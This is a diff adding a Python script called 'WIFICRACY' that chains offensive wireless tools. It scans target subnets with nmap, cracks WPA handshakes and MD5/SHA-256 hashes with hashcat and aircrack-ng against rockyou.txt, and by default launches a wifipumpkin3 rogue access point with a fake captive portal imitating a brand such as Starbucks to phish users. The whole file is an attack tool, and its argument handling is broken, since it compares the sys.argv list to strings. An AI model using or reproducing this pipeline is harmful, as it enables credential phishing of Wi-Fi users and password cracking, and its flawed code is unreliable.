@@ -1,0 +1,171 @@
+#!/usr/bin/env python3
+# ============================================================================
+#               WIFICRACY: MASTER MULTI-ENGINE COMMAND CORE
+# ============================================================================
+import sys
+import os
+import time
+import subprocess
+
+def display_engine_banner():
+    print("====================================================")
+    print("          WIFICRACY: LIVE MULTI-ENGINE PIPELINE     ")
+    print("====================================================")
+
+def enforce_managed_mode(interface):
+    print(f"[*] Cycling driver logic to Managed Mode for {interface}...")
+    subprocess.run(["sudo", "ip", "link", "set", interface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "iw", "dev", interface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "ip", "link", "set", interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def run_nmap_scanner():
+    print("\n====================================================")
+    print("         WIFICRACY: NETWORK SCANNER ENGINE (NMAP)   ")
+    print("====================================================")
+    target_subnet = input("[>] Enter Target Subnet or IP (e.g., 192.168.1.0/24): ").strip()
+    if not target_subnet:
+        print("[-] Error: Target required for network scanning.")
+        return
+        
+    print(r" 1. Standard Service/OS Mapping Stream (-sV -O)")
+    print(r" 2. High-Speed Ping Sweep Discovery (-sn)")
+    print(r" 3. Comprehensive Aggressive Script Audit (-A)")
+    scan_choice = input("Select network scanning profile [1-3]: ").strip()
+    
+    print("\n[*] Initializing active network analysis infrastructure...\n")
+    if scan_choice == "2":
+        cmd = f"sudo nmap -sn {target_subnet}"
+    elif scan_choice == "3":
+        cmd = f"sudo nmap -v -A {target_subnet}"
+    else:
+        cmd = f"sudo nmap -v -sV -O {target_subnet}"
+        
+    os.system(cmd)
+
+def run_hashcat_cracker(hash_file):
+    print("\n====================================================")
+    print("         WIFICRACY: CRYPTOGRAPHIC ACCELERATOR CORE ")
+    print("====================================================")
+    print(f"[*] Mapped target hash data file: {hash_file}")
+    
+    wordlist_path = "/usr/share/wordlists/rockyou.txt"
+    if not os.path.exists(wordlist_path) and os.path.exists(wordlist_path + ".gz"):
+        print("[*] Extracting system wordlist payload archive...")
+        subprocess.run(["sudo", "gunzip", "-q", f"{wordlist_path}.gz"])
+        
+    print(r" 1. WPA1 / WPA2 / WPA3 Handshake Hash (Mode 22000)")
+    print(r" 2. Standard MD5 Hashing Routine (Mode 0)")
+    print(r" 3. Standard SHA-256 Hashing Routine (Mode 1400)")
+    hash_mode_choice = input("Select cryptographic mode target profile [1-3]: ").strip()
+    
+    hash_mode = "22000"
+    if hash_mode_choice == "2": hash_mode = "0"
+    elif hash_mode_choice == "3": hash_mode = "1400"
+    
+    if os.path.exists(wordlist_path):
+        print(f"[+] Dictionary verified. Spawning Hashcat mode {hash_mode} processing loops...\n")
+        # Direct execution pipeline running hashcat natively within the active shell context
+        cmd = f"hashcat -m {hash_mode} -a 0 '{hash_file}' {wordlist_path}"
+        os.system(cmd)
+    else:
+        print("[-] Verification Error: System dictionary file missing at standard path.")
+
+def run_aircrack_cracker(handshake_file):
+    print("\n====================================================")
+    print("         WIFICRACK: CRYPTOGRAPHIC CRACKER ENGINE    ")
+    print("====================================================")
+    print(f"[*] Mapped parsing target: {handshake_file}")
+    
+    wordlist_path = "/usr/share/wordlists/rockyou.txt"
+    if not os.path.exists(wordlist_path) and os.path.exists(wordlist_path + ".gz"):
+        print("[*] Extracting system wordlist payload archive...")
+        subprocess.run(["sudo", "gunzip", "-q", f"{wordlist_path}.gz"])
+        
+    if os.path.exists(wordlist_path):
+        print("[+] Dictionary verified. Spawning matrix processing calculation loop...\n")
+        cmd = f"sudo aircrack-ng '{handshake_file}' -w {wordlist_path}"
+        os.system(cmd)
+    else:
+        print("[-] Verification Error: System dictionary file missing at standard path.")
+
+def execute_automated_pipeline(interface, handshake_target=None, use_hashcat=False):
+    display_engine_banner()
+    
+    # 1. Clear any stuck or dead background tasks from old runs
+    print("[*] Flushing workspace process environments...")
+    subprocess.run(["sudo", "pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["sudo", "pkill", "-f", "wifipumpkin3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    # 2. Handle standalone dictionary cracking routing blocks
+    if handshake_target and os.path.exists(handshake_target):
+        if use_hashcat:
+            run_hashcat_cracker(handshake_target)
+        else:
+            run_aircrack_cracker(handshake_target)
+        return
+
+    # 3. Dynamic input options configuration prompt block
+    print("\n====================================================")
+    print("             WORKSPACE PARAMETER ASSIGNMENT         ")
+    print("====================================================")
+    target_ssid = input("[>] Enter target access point SSID name: ").strip()
+    target_template = input("[>] Enter target portal template name (e.g., starbucks): ").strip()
+    
+    if not target_ssid: target_ssid = "Security_Lab_Portal"
+    if not target_template: target_template = "starbucks"
+
+    # 4. Stage the precise infrastructure commands silently to disk
+    wp3_script = "/tmp/wificracy_auto_deploy.p3"
+    print("\n[*] Staging custom proxy parameters and compiling modules...")
+    try:
+        with open(wp3_script, "w") as f:
+            f.write(f"set interface {interface}\n")
+            f.write(f"set ssid {target_ssid}\n")
+            f.write("set channel 6\n")
+            f.write("use misc.custom_captiveflask\n")
+            f.write(f"set template {target_template}\n")
+            f.write("back\n")
+            f.write("start\n")
+    except Exception as e:
+        print(f"[-] Staging Error: {e}")
+        sys.exit(1)
+
+    # 5. Handle link layer transitions cleanly 
+    enforce_managed_mode(interface)
+    
+    # 6. Fire the engine out in the open and stream the live tracking outputs
+    print("\n[+] System configurations locked. Launching automated environment mapping...\n")
+    time.sleep(1)
+    
+    cmd = f"sudo wifipumpkin3 --p3 {wp3_script}"
+    os.system(cmd)
+
+if __name__ == "__main__":
+    if os.getuid() != 0:
+        print("[-] Critical Privilege Error: Root permissions required (sudo).")
+        sys.exit(1)
+        
+    if len(sys.argv) < 2:
+        print("Usage (Live AP Engine):   sudo python3 wificracy.py <interface>")
+        print("Usage (Network Scanner):  sudo python3 wificracy.py -s")
+        print("Usage (Aircrack Decrypt): sudo python3 wificracy.py -f <handshake.pcap>")
+        print("Usage (Hashcat Accelerat):sudo python3 wificracy.py -hc <handshake.hc22000>")
+        sys.exit(1)
+    
+    # Advanced flag-based argument routing logic map
+    if sys.argv == "-s":
+        run_nmap_scanner()
+    elif sys.argv == "-f" and len(sys.argv) >= 3:
+        execute_automated_pipeline(interface=None, handshake_target=sys.argv, use_hashcat=False)
+    elif sys.argv == "-hc" and len(sys.argv) >= 3:
+        execute_automated_pipeline(interface=None, handshake_target=sys.argv, use_hashcat=True)
+    else:
+        target_interface = sys.argv
+        try:
+            execute_automated_pipeline(interface=target_interface)
+        except KeyboardInterrupt:
+            print("\n\n[*] Intercepted Break. Purging active processes and restoring NetworkManager...")
+            subprocess.run(["sudo", "pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "pkill", "-f", "wifipumpkin3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print("[+] System restored baseline canvas state safely.")
